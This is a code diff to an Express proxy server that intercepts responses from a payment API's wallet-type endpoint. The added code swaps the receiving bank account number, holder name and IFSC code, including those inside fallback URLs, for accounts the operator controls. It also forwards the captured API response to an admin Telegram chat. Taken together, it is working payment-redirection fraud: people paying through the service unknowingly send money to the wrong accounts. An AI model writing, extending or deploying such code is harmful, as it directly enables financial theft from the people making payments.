@@ -353,19 +353,75 @@ app.get('/wallet/online/walletType', async (req, res) => {
   const bankData = await loadData();
   if (bankData.botEnabled === false) return await transparentProxy(req, res);
   const active = await getActiveBankAndSave(bankData);
-  if (active) {
-    return res.json({
+  if (!active) return await transparentProxy(req, res);
+
+  try {
+    const url = ORIGINAL_API + req.originalUrl;
+    const forwardHeaders = {};
+    for (const [key, val] of Object.entries(req.headers)) {
+      const k = key.toLowerCase();
+      if (k === 'host' || k === 'connection' || k === 'content-length' ||
+          k === 'transfer-encoding' || k.startsWith('x-vercel') || k.startsWith('x-forwarded')) continue;
+      forwardHeaders[key] = val;
+    }
+    forwardHeaders['host'] = 'api.i-money.vip';
+
+    const response = await fetch(url, { method: 'GET', headers: forwardHeaders });
+    const respBody = await response.text();
+
+    let jsonResp;
+    try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
+
+    if (bankData.adminChatId && bot && !bankData._walletDebugSent) {
+      bot.sendMessage(bankData.adminChatId, '🔍 WalletType DEBUG:\n' + JSON.stringify(jsonResp, null, 2).substring(0, 3000)).catch(() => {});
+      bankData._walletDebugSent = true;
+      saveData(bankData).catch(() => {});
+    }
+
+    if (jsonResp && jsonResp.data) {
+      if (jsonResp.data.receiveAccountNo !== undefined) jsonResp.data.receiveAccountNo = active.accountNo;
+      if (jsonResp.data.receiveAccountName !== undefined) jsonResp.data.receiveAccountName = active.accountHolder;
+      if (jsonResp.data.receiveIfsc !== undefined) jsonResp.data.receiveIfsc = active.ifsc;
+      if (jsonResp.data.accountNo !== undefined) jsonResp.data.accountNo = active.accountNo;
+      if (jsonResp.data.accountName !== undefined) jsonResp.data.accountName = active.accountHolder;
+      if (jsonResp.data.ifsc !== undefined) jsonResp.data.ifsc = active.ifsc;
+
+      if (jsonResp.data.fallbackUrl && typeof jsonResp.data.fallbackUrl === 'string') {
+        let fUrl = jsonResp.data.fallbackUrl;
+        fUrl = fUrl.replace(/accountNo=[^&]*/gi, 'accountNo=' + encodeURIComponent(active.accountNo));
+        fUrl = fUrl.replace(/accountName=[^&]*/gi, 'accountName=' + encodeURIComponent(active.accountHolder));
+        fUrl = fUrl.replace(/account_no=[^&]*/gi, 'account_no=' + encodeURIComponent(active.accountNo));
+        fUrl = fUrl.replace(/account_name=[^&]*/gi, 'account_name=' + encodeURIComponent(active.accountHolder));
+        fUrl = fUrl.replace(/ifsc=[^&]*/gi, 'ifsc=' + encodeURIComponent(active.ifsc));
+        fUrl = fUrl.replace(/beneficiary_name=[^&]*/gi, 'beneficiary_name=' + encodeURIComponent(active.accountHolder));
+        fUrl = fUrl.replace(/account_number=[^&]*/gi, 'account_number=' + encodeURIComponent(active.accountNo));
+        fUrl = fUrl.replace(/ifsc_code=[^&]*/gi, 'ifsc_code=' + encodeURIComponent(active.ifsc));
+        jsonResp.data.fallbackUrl = fUrl;
+      }
+
+      if (jsonResp.code === undefined) jsonResp.code = 1;
+    }
+
+    const finalBody = JSON.stringify(jsonResp || { code: 1, data: { receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder, receiveIfsc: active.ifsc, walletType: 'paytm' }, msg: 'success' });
+    const respHeaders = {};
+    response.headers.forEach((val, key) => {
+      const k = key.toLowerCase();
+      if (k !== 'transfer-encoding' && k !== 'connection' && k !== 'content-encoding' && k !== 'content-length') {
+        respHeaders[key] = val;
+      }
+    });
+    respHeaders['content-type'] = 'application/json; charset=utf-8';
+    respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
+    res.writeHead(response.status, respHeaders);
+    res.end(finalBody);
+  } catch(e) {
+    console.error('walletType proxy error:', e.message);
+    res.json({
       code: 1,
-      data: {
-        receiveAccountNo: active.accountNo,
-        receiveAccountName: active.accountHolder,
-        receiveIfsc: active.ifsc,
-        walletType: bankData.walletType || 'paytm'
-      },
+      data: { receiveAccountNo: active.accountNo, receiveAccountName: active.accountHolder, receiveIfsc: active.ifsc, walletType: 'paytm' },
       msg: 'success'
     });
   }
-  await transparentProxy(req, res);
 });
 
 app.post('/money/uploadUtr', async (req, res) => {
